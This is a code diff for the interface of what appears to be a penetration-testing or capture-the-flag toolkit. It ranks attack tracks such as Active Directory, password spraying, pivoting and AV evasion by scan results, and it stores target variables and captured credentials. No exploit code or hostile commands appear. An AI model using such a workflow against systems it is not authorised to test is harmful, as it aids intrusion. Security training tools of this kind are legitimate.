   {id:"findings", pill:"__findings", label:"Findings", colour:"#fb923c", fn:()=>renderFindings()},
   {id:"writeup", pill:"__writeup", label:"Write-up",  colour:"#5aa2ff", fn:()=>renderWriteup()}
 ];
@@ -3404,29 +3784,136 @@ function renderKeys(){
   host.appendChild(n);
 }
 
+// ---------- track ranking ----------
+// Eleven tracks shown as eleven identical pills is a menu, not a route. The
+// score orders them by what the scan and your progress actually imply, and the
+// reason is shown on the pill so the ordering is never mysterious. Everything
+// that scores zero drops under "more" rather than disappearing.
+function trackScore(t){
+  const c=ctx;
+  switch(t.id){
+    case "recon":     return c.scanned?[15,"re-run when you stall"]:[100,"start here"];
+    case "ad":        return c.isAD?[90,"88/389 open"]:[0,""];
+    case "adcs":      return c.isAD?(c.creds?[58,"creds in hand"]:[22,"domain present"]):[0,""];
+    case "windows":   return c.isWindows?(c.isAD?[28,"domain-joined"]:[80,"Windows, no domain"]):[0,""];
+    case "linux":     return c.isLinux?[78,"no Windows ports"]:[0,""];
+    case "web":       return c.hasWeb?[76,"web service open"]:[0,""];
+    case "pw":        return c.hashes?[62,c.hashes+" hash"+(c.hashes===1?"":"es")+" logged"]:(c.creds?[26,"creds to spray"]:[0,""]);
+    case "pivot":     return c.shell!=="none"?[52,"you have a shell"]:[0,""];
+    case "container": return c.shell!=="none"?[34,"check for a container"]:[0,""];
+    case "av":        return (c.isWindows&&c.shell!=="none")?[30,"payloads getting caught?"]:[0,""];
+    case "bof":       return [0,""];
+  }
+  return [0,""];
+}
+let _rankedTracks=TRACKS.slice();
+function rankTracks(){
+  const scored=TRACKS.map(t=>{const [s,why]=trackScore(t);return {t,s,why};});
+  scored.sort((a,b)=>b.s-a.s||TRACKS.indexOf(a.t)-TRACKS.indexOf(b.t));
+  _rankedTracks=scored.map(x=>x.t);
+  return scored;
+}
+
+// ---------- progressive variable fields ----------
+// Seven always-on inputs made the bar look like a form to fill in before you
+// could start. BOX and IP are the only two you need on minute one; the rest
+// appear when the context says they matter, or when you ask for them.
+let _varsPref=null;   // null = follow the context, true/false = you decided
+function varsAuto(){
+  return ctx.shell!=="none"||ctx.isAD||ctx.creds>0||
+    ["LHOST","LPORT","DOMAIN","USER","PASS"].some(k=>VARS[k]);
+}
+function syncVarFields(){
+  const vars=document.getElementById("vars"),btn=document.getElementById("varsMore");
+  if(!vars||!btn)return;
+  const open=_varsPref===null?varsAuto():_varsPref;
+  vars.classList.toggle("open",open);
+  btn.textContent=open?"fewer ▴":"more ▾";
+  btn.setAttribute("aria-expanded",String(open));
+}
+
+// ---------- credential adoption ----------
+// {USER}/{PASS} used to be a second place to type a credential already written
+// into the table below. The table is now the source: any row can be promoted to
+// the live pair, and the first complete row promotes itself.
+function adoptCred(r){
+  if(!r)return;
+  const u=(r.u||"").trim(),s=(r.s||"").trim();
+  if(u){VARS.USER=u;const e=document.getElementById("v_USER");if(e)e.value=u;}
+  if(s){VARS.PASS=s;const e=document.getElementById("v_PASS");if(e)e.value=s;}
+  publishVars();saveVars();refreshTokens();refreshChrome();
+}
+function autoAdoptCred(){
+  if(VARS.USER||VARS.PASS)return;
+  const r=(notesData.creds||[]).find(c=>(c.u||"").trim()&&(c.s||"").trim());
+  if(r)adoptCred(r);
+}
+
+// ---------- header menus ----------
+function wireMenus(){
+  document.querySelectorAll("details.menu").forEach(d=>{
+    d.querySelectorAll(".menu-body button").forEach(b=>b.addEventListener("click",()=>{d.open=false;}));
+  });
+  document.addEventListener("click",e=>{
+    document.querySelectorAll("details.menu[open]").forEach(d=>{if(!d.contains(e.target))d.open=false;});
+  });
+  document.addEventListener("keydown",e=>{
+    if(e.key!=="Escape")return;
+    document.querySelectorAll("details.menu[open]").forEach(d=>{d.open=false;});
+  },true);
+}
+
 // ---------- pills ----------
 const toolsRow=document.getElementById("tools");
 const tabs=document.getElementById("tracks");
-const overviewPill=document.createElement("button");
-overviewPill.className="track-pill";overviewPill.dataset.id="__overview";overviewPill.type="button";
-overviewPill.style.setProperty("--c","#5aa2ff");
-overviewPill.innerHTML='<span class="dot"></span>Overview';
-overviewPill.addEventListener("click",renderOverview);
-tabs.appendChild(overviewPill);
-TRACKS.forEach((t,i)=>{
-  const b=document.createElement("button");b.className="track-pill";b.dataset.id=t.id;b.type="button";
-  b.style.setProperty("--c",t.colour);
-  b.innerHTML=`<span class="dot"></span>${t.name}`;
-  b.title=t.name+" track"+(i<9?"  (press "+(i+1)+")":"");
-  b.addEventListener("click",()=>renderTrack(t));
-  tabs.appendChild(b);
-});
-TOOLS.forEach(t=>{
-  const b=document.createElement("button");b.className="track-pill";b.dataset.id=t.pill;b.type="button";
-  b.style.setProperty("--c",t.colour);
-  b.innerHTML='<span class="dot"></span>'+t.label;
-  b.addEventListener("click",t.fn);toolsRow.appendChild(b);
-});
+function pill(id,colour,label,why,onClick,demoted,title){
+  const b=document.createElement("button");b.className="track-pill"+(demoted?" demoted":"");
+  b.dataset.id=id;b.type="button";b.style.setProperty("--c",colour);
+  const dot=document.createElement("span");dot.className="dot";b.appendChild(dot);
+  b.appendChild(document.createTextNode(label));
+  if(why){
+    const w=document.createElement("span");w.className="why";w.textContent=why;
+    w.setAttribute("aria-hidden","true");b.appendChild(w);
+    b.setAttribute("aria-label",label+" — "+why);
+  }
+  if(title)b.title=title;
+  b.addEventListener("click",onClick);
+  return b;
+}
+function moreBtn(row,nHidden){
+  const b=document.createElement("button");b.className="morepill";b.type="button";
+  const set=()=>{const open=row.classList.contains("show-all");
+    b.textContent=open?"less ‹":"+"+nHidden+" more ›";
+    b.setAttribute("aria-expanded",String(open));};
+  b.addEventListener("click",()=>{row.classList.toggle("show-all");set();});
+  set();return b;
+}
+function renderPills(){
+  const active=document.querySelector(".track-pill.active");
+  const activeId=active?active.dataset.id:null;
+  const wasOpenT=tabs.classList.contains("show-all"),wasOpenO=toolsRow.classList.contains("show-all");
+  tabs.innerHTML="";toolsRow.innerHTML="";
+
+  tabs.appendChild(pill("__overview","#5aa2ff","Overview","",renderOverview,false,"Overview  (press 0)"));
+  const scored=rankTracks();
+  // Anything with a reason to be on screen is suggested; the rest still exist,
+  // one click away, so browsing is never blocked.
+  const shown=scored.filter(x=>x.s>0),hidden=scored.filter(x=>x.s<=0);
+  shown.forEach((x,i)=>tabs.appendChild(pill(x.t.id,x.t.colour,x.t.name,x.why,()=>renderTrack(x.t),false,
+    x.t.name+" track"+(i<9?"  (press "+(i+1)+")":""))));
+  hidden.forEach(x=>tabs.appendChild(pill(x.t.id,x.t.colour,x.t.name,"",()=>renderTrack(x.t),true,x.t.name+" track")));
+  if(hidden.length)tabs.appendChild(moreBtn(tabs,hidden.length));
+
+  const relevant=TOOLS.filter(t=>!t.when||t.when(ctx)),rest=TOOLS.filter(t=>t.when&&!t.when(ctx));
+  relevant.forEach(t=>toolsRow.appendChild(pill(t.pill,t.colour,t.label,"",t.fn,false,t.label)));
+  rest.forEach(t=>toolsRow.appendChild(pill(t.pill,t.colour,t.label,"",t.fn,true,t.label)));
+  if(rest.length)toolsRow.appendChild(moreBtn(toolsRow,rest.length));
+
+  if(wasOpenT)tabs.classList.add("show-all");
+  if(wasOpenO)toolsRow.classList.add("show-all");
+  if(activeId){const el=[...document.querySelectorAll(".track-pill")].find(x=>x.dataset.id===activeId);
+    if(el)el.classList.add("active");}
+}
 
 // ---------- variable bar ----------
 VAR_KEYS.forEach(k=>{
@@ -3434,7 +3921,7 @@ VAR_KEYS.forEach(k=>{
   el.addEventListener("input",()=>{
     VARS[k]=el.value.trim();
     if(k==="BOX"){reloadBoxState();applyProg();renderBoxPicker();}
-    else publishVars();
+    else {publishVars();saveVars();}
     refreshTokens();
   });
   if(k==="BOX")el.addEventListener("change",()=>{if(VARS.BOX){rememberBox();publishVars();}});
@@ -3442,6 +3929,10 @@ VAR_KEYS.forEach(k=>{
 
 // ---------- box manager controls ----------
 document.getElementById("boxPick").addEventListener("change",e=>switchBox(e.target.value));
+document.getElementById("varsMore").addEventListener("click",()=>{
+  const open=_varsPref===null?varsAuto():_varsPref;_varsPref=!open;syncVarFields();
+});
+wireMenus();
 document.getElementById("boxNew").onclick=()=>{
   const n=(prompt("Name for the new box:","")||"").trim().replace(/[^A-Za-z0-9._-]/g,"-").slice(0,60);
   if(!n)return;
@@ -3540,7 +4031,7 @@ document.addEventListener("keydown",e=>{
 
   if(e.key==="/"){e.preventDefault();palOpen();return;}
   if(e.key==="?"){e.preventDefault();renderKeys();return;}
-  if(e.key>="1"&&e.key<="9"){const t=TRACKS[+e.key-1];if(t){e.preventDefault();renderTrack(t);}return;}
+  if(e.key>="1"&&e.key<="9"){const t=_rankedTracks[+e.key-1];if(t){e.preventDefault();renderTrack(t);}return;}
   if(e.key==="0"){e.preventDefault();renderOverview();return;}
   if(e.key==="e"){document.querySelectorAll(".phase").forEach(p=>p.open=true);return;}
   if(e.key==="c"){document.querySelectorAll(".phase").forEach(p=>p.open=false);return;}
@@ -3590,7 +4081,17 @@ const _h1=document.querySelector(".bar-top h1");if(_h1){
 })();
 const _v=document.getElementById("verStamp");if(_v)_v.textContent="v"+APP_VERSION;
 
+// A reload used to land on "no box set" with every variable blank even though
+// the ticks, scan and notes were all still there under the last box's name.
+(function restoreLastBox(){
+  const shared=store.json("toolkit:vars",{})||{};
+  const name=typeof shared.BOX==="string"?shared.BOX:"";
+  if(!name||!knownBoxes().includes(name))return;
+  VARS.BOX=name;
+  const el=document.getElementById("v_BOX");if(el)el.value=name;
+})();
 progress=loadProg();
+loadVars();
 reloadNotes();
 reloadTimer();
 loadEvidence();
@@ -3598,6 +4099,7 @@ loadAttempts();
 loadFindings();
 renderBoxPicker();
 publishVars();
+refreshChrome();
 document.getElementById("drawer").addEventListener("toggle",e=>{if(e.target.open)renderStuckLive();});
 document.querySelector(".stuck details").addEventListener("toggle",e=>{if(e.target.open)renderStuckLive();});
 
